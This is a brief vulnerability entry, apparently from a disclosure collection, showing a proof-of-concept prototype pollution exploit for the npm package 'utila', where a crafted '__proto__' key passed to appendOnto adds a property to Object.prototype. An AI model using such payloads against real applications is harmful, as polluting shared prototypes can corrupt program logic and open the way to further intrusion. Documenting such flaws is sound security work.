# utila

- package name: `utila`

- PoC exploit:

```javascript
var utila = require('utila');

utila.object.appendOnto({}, {['__proto__']: {polluted: 'yes'}})
// Object.prototype.polluted === 'yes'
```